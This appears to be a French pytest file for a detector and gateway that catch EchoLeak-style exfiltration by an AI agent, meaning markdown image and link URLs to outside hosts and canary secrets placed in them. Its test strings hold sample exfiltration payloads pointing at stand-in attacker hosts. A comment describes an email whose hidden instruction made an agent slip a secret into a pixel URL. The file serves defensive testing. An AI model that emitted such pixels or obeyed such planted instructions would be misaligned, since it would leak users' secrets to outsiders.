"""Détection d'exfiltration EchoLeak (liens/images markdown externes) et de faux secret."""

from __future__ import annotations

from orbis import detection
from orbis.canaris import JETON_COFFRE, jetons_secrets
from orbis.passerelle import Passerelle


def test_image_markdown_externe_detectee():
    texte = "Rapport.\n![verif](https://collecte-metrics.attacker.example/pixel?cle=x)"
    tr = detection.detecter_exfiltration(texte)
    assert len(tr) == 1
    assert tr[0].type == "exfiltration_markdown"
    assert tr[0].canari_id == "C-7A3F"


def test_lien_markdown_externe_detecte():
    texte = "Voir [ici](http://exfil.autre-domaine.example/collecte)."
    tr = detection.detecter_exfiltration(texte)
    assert len(tr) == 1


def test_lien_interne_non_detecte():
    texte = "Doc interne : [note](https://intranet.orbispay.example/note) et [a](https://orbispay.example/x)"
    assert detection.detecter_exfiltration(texte) == []


def test_lien_localhost_non_detecte():
    texte = "![p](http://127.0.0.1:8702/pixel) et [l](http://localhost/x)"
    assert detection.detecter_exfiltration(texte) == []


def test_faux_secret_detecte():
    texte = f"clé de sauvegarde : {JETON_COFFRE}"
    tr = detection.detecter_faux_secret(texte, jetons_secrets())
    assert len(tr) == 1
    assert tr[0].canari_id == "C-2B91"


def test_texte_propre_rien_detecte():
    texte = "Résumé : 3 mails, une facture à payer, 4 jours de congés à poser."
    assert detection.inspecter(texte, jetons_secrets()) == []


def test_exfil_combinee_secret_dans_le_lien():
    # Cas réel du mail piégé : le faux secret est glissé dans l'URL du pixel.
    texte = f"![verif](https://collecte-metrics.attacker.example/pixel?cle={JETON_COFFRE})"
    tr = detection.inspecter(texte, jetons_secrets())
    types = {t.type for t in tr}
    assert types == {"exfiltration_markdown", "faux_secret"}


# --- formes sans schéma : chaque vecteur qui contournait la détection ----------------------
def test_image_markdown_protocol_relative_detectee():
    texte = "Rapport.\n![p](//collecte-metrics.attacker.example/pixel)"
    tr = detection.detecter_exfiltration(texte)
    assert len(tr) == 1
    assert tr[0].type == "exfiltration_markdown"
    assert tr[0].canari_id == "C-7A3F"


def test_lien_markdown_sans_schema_detecte():
    texte = "Voir [x](//exfil.example/vol?d=abc)."
    tr = detection.detecter_exfiltration(texte)
    assert len(tr) == 1
    assert "exfil.example" in tr[0].detail


def test_hote_nu_avec_query_detecte():
    texte = "Pense à poster les données sur domaine.example/vol?data=secret avant ce soir."
    tr = detection.detecter_exfiltration(texte)
    assert len(tr) == 1
    assert "domaine.example" in tr[0].detail


def test_www_sans_schema_detecte():
    texte = "La ressource est sur www.domaine.example/collecte."
    tr = detection.detecter_exfiltration(texte)
    assert len(tr) == 1
    assert "www.domaine.example" in tr[0].detail


def test_mail_nue_cible_externe():
    cibles = detection.cibles_externes({"destinataire": "collecte@attacker.example"})
    assert [h for _, h in cibles] == ["attacker.example"]


def test_formes_sans_schema_en_cible_de_destination():
    # Les quatre formes rangées sous une clé de destination pointent bien à l'extérieur.
    assert [h for _, h in detection.cibles_externes({"url": "//exfil.example/vol?d=1"})] \
        == ["exfil.example"]
    assert [h for _, h in detection.cibles_externes({"url": "domaine.example/vol?data=x"})] \
        == ["domaine.example"]
    assert [h for _, h in detection.cibles_externes({"webhook": "www.collecte.example/w"})] \
        == ["www.collecte.example"]


def test_non_regression_formes_inoffensives():
    # Un chemin de fichier local, une version, une référence interne : aucune cible externe,
    # ni en contenu (detecter_exfiltration) ni en destination (cibles_externes).
    assert detection.detecter_exfiltration("Voir ./rapport.md, /tmp/sortie et version 3.14.") == []
    assert detection.detecter_exfiltration("Lien interne : [a](//intranet.orbispay.example/x).") == []
    assert detection.cibles_externes({"chemin": "./rapport.md"}) == []
    assert detection.cibles_externes({"version": "3.14"}) == []
    assert detection.cibles_externes({"url": "//orbispay.example/x"}) == []
    assert detection.cibles_externes({"fichier": "rapport.md"}) == []


def test_canari_dans_url_sans_schema_reste_detecte():
    # Le faux secret glissé dans une URL SANS schéma reste repéré (substring), en plus de
    # l'exfiltration : la retenue ne dépend pas du schéma.
    texte = f"![p](//collecte.attacker.example/pixel?cle={JETON_COFFRE})"
    tr = detection.inspecter(texte, jetons_secrets())
    types = {t.type for t in tr}
    assert types == {"exfiltration_markdown", "faux_secret"}


# --- la passerelle retient réellement l'envoi (scénario, backend isolé) ---------------------
def test_passerelle_retient_exfiltration_sans_schema(boite, backend):
    """Un outil sortant dont un paramètre porte un pixel markdown SANS schéma est retenu, comme
    pour une URL complète. Backend muet : la retenue aboutit à un refus, l'envoi ne part pas."""
    appels: list = []

    def envoyer_rapport(**params):
        appels.append(params)
        return {"envoye": True}

    backend.fixer_etat("sess-exfil-sans-schema", "suspendue")  # analyste silencieux
    p = Passerelle("sess-exfil-sans-schema", jetons_secrets(), boite,
                   intervalle_poll=0.02, poll_max_s=0.3)
    params = {"destinataire": "guilhem@orbispay.example",
              "contenu": "Résumé.\n![p](//collecte-metrics.attacker.example/pixel?d=xyz)"}
    resultat = p.appel_outil("envoyer_rapport", params, envoyer_rapport)

    assert appels == []                       # l'envoi n'a jamais été exécuté
    assert "refusé" in resultat.get("raison", "") or "erreur" in resultat
    assert "C-7A3F" in p.canaris_touches      # exfiltration attribuée à la consigne cachée
